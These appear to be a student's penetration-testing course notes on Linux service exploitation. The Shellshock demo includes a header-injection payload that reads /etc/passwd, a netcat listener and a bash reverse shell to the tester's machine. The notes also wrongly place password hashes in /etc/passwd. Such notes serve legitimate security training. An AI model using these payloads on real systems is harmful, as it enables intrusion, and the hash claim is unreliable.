
## Frequently Exploited Linux Services 

Frequently Exploited Linux Services

- Linux is a free and open source operating system that is comprised of the Linux kernel, which was developed by Linus Torvalds, and the GNU toolkit, which is a collection of software and utilities that was started and developed by Richard Stallman.
- This combination of open source software is what makes up the Linux OS as a whole, and it is commonly referred to as GNU/Linux.
- Linux has various use cases, however, it is typically deployed as a server operating system. For this reason, there are specific services and protocols that will typically be found running on a Linux server. 
- These services provide an attacker with an access vector that they can utilize to gain access to a target host. 
- Having a good understanding of what these services are, how they work and their potential vulnerabilities is a vitally important skill to have as a penetration tester
  
![[Pasted image 20230706231607.png]]


## Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock) 

CVE-2014-6271 - Shellshock:

- Shellshock (CVE-2014-6271) is a family of vulnerabilities in the Bash shell (since V1.3) that allows an attacker to execute remote arbitrary commands via Bash, leading to potential remote access to the target system via a reverse shell.
- The Shellshock vulnerability was discovered by Stéphane Chazelas on September 12, 2014, and publicly disclosed on September 24, 2014.
- Bash is a \*Nix shell that is part of the GNU project and serves as the default shell for most Linux distributions.

- The Shellshock vulnerability occurs due to a flaw in Bash, where Bash mistakenly executes trailing commands after a series of characters: "() {:;};"
	- als deze characters in bash worden ingevoerd dan wordt alles erna ook excuted door bash. 
- This vulnerability specifically affects Linux systems, as Windows does not use Bash since it is not a \Nix-based operating system.
- In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
- CGI (Common Gateway Interface) scripts are utilized by Apache to execute arbitrary commands on the Linux system, with the output being displayed to the client

Shellshock Exploration: 

- To exploit the Shellshock vulnerability, you need to identify an input vector or script that allows communication with Bash.
- In the case of an Apache web server, you can leverage any legitimate CGI scripts that are accessible on the server.
- When a CGI script is executed, the web server starts a new process and runs the script using Bash.
- The Shellshock vulnerability can be exploited manually by crafting specific payloads or automatically using an MSF exploit module.


-- Demo --- 
 
- perform service detection scan on target to confirm apache running 
- visit the ip in browser 
	- identify CGI script on webpage (look at page source) ![[Pasted image 20230710132143.png]]
	 the cgi script is passing commands in bash you can use this as input vector but before that you need to check if this system is vulnerable to shellshock explotation -> check in nmap 
- Check if system is vulnerable to shellshock: nmap -sV ip --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 
	- `--script=http-shellshock`: This option specifies that you want to use the `http-shellshock` script. Shellshock is a vulnerability in the Bash shell that allows remote code execution. The script is designed to detect if the target web server is vulnerable to this specific vulnerability.
	- `--script-args "http-shellshock.uri=/gettime.cgi"`: This argument provides additional parameters to the `http-shellshock` script. In this case, it sets the URI (Uniform Resource Identifier) to `/gettime.cgi`, which is the path of a specific CGI script on the target server. This allows the script to test the vulnerability specifically on that CGI script.
	- go to the browser and visit targetip/cgi link - configure Mozilla with foxyproxy - select Burp so all the traffic is redirected to Burp ![[Pasted image 20230710133011.png]]
- Open up Burb: 
	- go to proxy and make sure intercept is on 
	- make get request to cgi script in browser 
	- send incoming get request in burp to repeater 
		- in repeater get rid of user-agent and replace them with own characters: () {   :;    } ; echo;   echo;  /bin/bash -c 'cat   /etc/passwd'![[Pasted image 20230710133404.png]] ![[Pasted image 20230710133525.png]]
- gain a reverse shell on the target system 
	- set up a listener with netcat: nc -nvlp 1234 
	- open in burp: 'bash -i>&/dev/tcp/your-kali-ip/port-listner 0>&1' ![[Pasted image 20230710141925.png]]
		- - `bash -i`: This starts an interactive Bash shell with the `-i` option, allowing for interactive input/output. the main difference between interactive (`-i`) and non-interactive modes in Bash is the level of interactivity and the availability of certain features within the shell session. Interactive mode provides a more interactive and dynamic shell environment, while non-interactive mode is typically used for running scripts or commands that don't require user interaction.
		- `>&/dev/tcp/your-kali-ip/port-listener`: This redirects both the standard output and standard error streams to a TCP connection established with the specified IP address and port. You need to replace `your-kali-ip` with the actual IP address of your Kali machine, and `port-listener` with the desired port number for the listener.
		- `0>&1`: This redirects the standard input (file descriptor 0) to the standard output (file descriptor 1). `, it means we are redirecting the input of the command to the same place where the output is going.
	- Now you have a reverse shell
		- Run whoami 
		- cat /etc/\*issue 
		- uname -a 

How do we exploit this vulnerability in metasploit? 
- msfconsole 
- search shellshock 
	- we have aux module and exploit module 
	- use exploit and specify the options including path to cgi script 
	- you have meterpreter session 
		- sysinfo s
		- elevate privilege's 


-- Lab -- 














## Exploiting FTP 

- FTP (File Transfer Protocol) is a protocol that utilizes TCP port 21 and enables file sharing between a server and client/clients.
    - It is commonly used for transferring files to and from the directory of a web server.
- FTP authentication requires a username and password combination, making it possible to perform a brute-force attack on the FTP server to discover valid credentials.
- In certain cases, FTP servers may be configured to allow anonymous access, granting unrestricted access to the FTP server without requiring any legitimate credentials.
	- anonymous access: login without credentials 


--- demo - --


























## Exploiting SSH 

- SSH (Secure Shell) is a remote administration protocol that provides encryption and serves as the successor to Telnet.
- It is commonly used for remote access to servers and systems.
- SSH uses TCP port 22 as its default port, although it can be configured to use other open TCP ports.
- SSH authentication can be configured in two ways:
    - Username and password authentication
    - Key-based authentication
- In the case of username and password authentication, a brute-force attack can be attempted on the SSH server to discover valid credentials and gain access to the target system.


## Exploiting SAMBA 

SMB (Server Message Block):

- SMB is a network file sharing protocol used for sharing files and peripherals between computers on a local network (LAN).
- The default port for SMB is 445 (TCP). However, it originally ran on top of NetBIOS using port 139.
- Samba is the Linux implementation of SMB, enabling Windows systems to access Linux shares and devices.

Exploiting SAMBA:

- SAMBA utilizes username and password authentication for accessing servers or network shares.
- A brute-force attack can be performed on the SAMBA server to obtain legitimate credentials.
- Once legitimate credentials are obtained, the SMBMap utility can be used to enumerate SAMBA share drives, list share contents, download files, and execute remote commands on the target.
- Another tool called smbclient, part of the SAMBA software suite, provides a client interface similar to FTP. It allows downloading files from the server to the local machine, uploading files from the local machine to the server, and retrieving directory information from the server




## Linux Kernel Exploitation 

Kernel Exploits on Linux:

- Kernel exploits on Linux target vulnerabilities in the Linux kernel to execute arbitrary code, enabling the execution of privileged system commands or obtaining a system shell.
- The process for exploiting kernel vulnerabilities will vary based on the targeted kernel version, distribution, and the specific kernel exploit being utilized.
- Privilege escalation on Linux systems typically follows this methodology:
    - Identifying kernel vulnerabilities
    - Downloading, compiling, and transferring kernel exploits to the target system

Tools & Environment:

- Linux-Exploit-Suggester: This tool helps detect security deficiencies in a given Linux kernel or Linux-based machine. It utilizes heuristics methods to assess the exposure of the kernel to publicly known Linux kernel exploits.
    - GitHub: [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- Note: The techniques demonstrated in this video are performed on an Ubuntu 12.04 VM.


## Exploiting Misconfigured Cron Jobs 

Cron Jobs:

- Linux utilizes a utility called Cron for task scheduling.
- Cron is a time-based service that runs applications, scripts, and other commands on a specified schedule.
- A recurring task configured with Cron is called a Cron job. It enables automation and repetition of various functions on a system, such as backups, upgrades, and patches.
- The crontab file is the configuration file used by Cron to store and manage created Cron jobs.

Exploiting Misconfigured Cron Jobs:

- Cron jobs can be executed by any user on the system. It is crucial to monitor Cron jobs that have been set up to run as the "root" user.
- When a Cron job is run as the root user, any script or command executed by that job also runs with root privileges, potentially granting full administrative access.
- To escalate privileges, it is necessary to identify Cron jobs scheduled by the root user or investigate the files being processed by those Cron jobs.

## Exploiting SUID Binaries 

SUID (Set Owner User ID) Permissions:

- In addition to the main file access permissions (read, write, and execute), Linux provides specialized permissions for specific situations. One of these permissions is the SUID permission.
- When applied, the SUID permission allows users to execute a script or binary with the permissions of the file owner, rather than the user running the script or binary.
- SUID permissions are commonly used to allow unprivileged users to run specific scripts or binaries with "root" permissions. However, it's important to note that this privilege is limited to the execution of the script and does not grant overall privilege elevation. Improperly configured SUID binaries can be exploited by unprivileged users to gain elevated access through misconfigurations or vulnerabilities within the binary or script.

Exploiting SUID Binaries:

- The goal is to exploit the SUID functionality to elevate privileges. The success of the attack depends on the following factors:
    - Owner of the SUID binary: We target SUID binaries owned by the "root" user or other privileged users to achieve privilege escalation.
    - Access permissions: Executable permissions are required to execute the SUID binary and exploit its functionality.


## Dumping Linux Password Hashes 

Multi-User Support in Linux:

- Linux supports multiple users, allowing simultaneous access to the system. This offers both advantages and disadvantages from a security perspective. Multiple accounts provide multiple access vectors for attackers, increasing the overall risk of the server.

User Account Information:

- User account information for Linux is stored in the `/etc/passwd` file.
- Passwords in the passwd file are encrypted, making them unreadable by users on the system.
- Encrypted passwords for users are stored in the `/etc/shadow` file, which can only be accessed and read by the root account. This is a crucial security feature that prevents other accounts from accessing the hashed passwords.

Linux Password Hashes:

- The passwd file provides information about the hashing algorithm used and the password hash. This information helps determine the type and strength of the hashing algorithm.
- The type of hashing algorithm can be determined by looking at the number after the username encapsulated by the dollar symbol (`$`).


![[Pasted image 20230706232136.png]]



